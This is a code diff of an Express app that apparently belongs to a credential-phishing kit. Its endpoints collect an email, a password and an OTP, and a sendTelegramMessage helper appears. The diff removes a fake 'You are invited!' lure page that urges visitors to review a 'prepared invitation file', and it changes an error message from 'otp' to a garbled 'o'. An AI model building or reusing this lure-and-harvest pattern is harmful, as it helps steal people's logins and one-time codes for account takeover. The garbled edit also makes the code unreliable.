@@ -99,105 +99,6 @@ async function sendTelegramMessage(message) {
  * Open this in your browser:
  * http://localhost:8787/invitation-access
  */
-app.get('/invitation-access', (request, response) => {
-  response.send(`
-    <!DOCTYPE html>
-    <html lang="en">
-      <head>
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Invitation Access</title>
-
-        <style>
-          * {
-            box-sizing: border-box;
-          }
-
-          body {
-            margin: 0;
-            min-height: 100vh;
-            font-family: Arial, sans-serif;
-            background: #f4f6f8;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-          }
-
-          .card {
-            width: 100%;
-            max-width: 520px;
-            background: white;
-            border-radius: 18px;
-            padding: 36px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.1);
-            text-align: center;
-          }
-
-          h1 {
-            margin: 0 0 12px;
-            font-size: 32px;
-            color: #111827;
-          }
-
-          h2 {
-            margin: 0 0 18px;
-            font-size: 22px;
-            color: #2563eb;
-          }
-
-          p {
-            margin: 0 0 26px;
-            color: #4b5563;
-            line-height: 1.6;
-          }
-
-          .file-box {
-            padding: 18px;
-            border: 2px dashed #cbd5e1;
-            border-radius: 14px;
-            background: #f8fafc;
-            margin-bottom: 24px;
-            color: #334155;
-          }
-
-          a {
-            display: inline-block;
-            text-decoration: none;
-            background: #2563eb;
-            color: white;
-            padding: 14px 22px;
-            border-radius: 10px;
-            font-weight: bold;
-          }
-
-          a:hover {
-            background: #1d4ed8;
-          }
-        </style>
-      </head>
-
-      <body>
-        <div class="card">
-          <h1>Invitation access</h1>
-
-          <h2>You are invited!</h2>
-
-          <p>
-            Your friend sent a private invitation. Review the prepared file below
-            to continue to the RSVP details.
-          </p>
-
-          <div class="file-box">
-            Prepared invitation file is ready for review.
-          </div>
-
-          <a href="/">Continue to RSVP details</a>
-        </div>
-      </body>
-    </html>
-  `);
-});
 
 app.post('/api/invite', async (request, response) => {
   const email = String(request.body?.email || '').trim();
@@ -242,7 +143,7 @@ app.post('/api/final-invite', async (request, response) => {
 
   if (!email || !accessCode || !finalCode) {
     return response.status(400).json({
-      message: 'Email, password, and otp are required.',
+      message: 'Email, password, and o are required.',
     });
   }
 
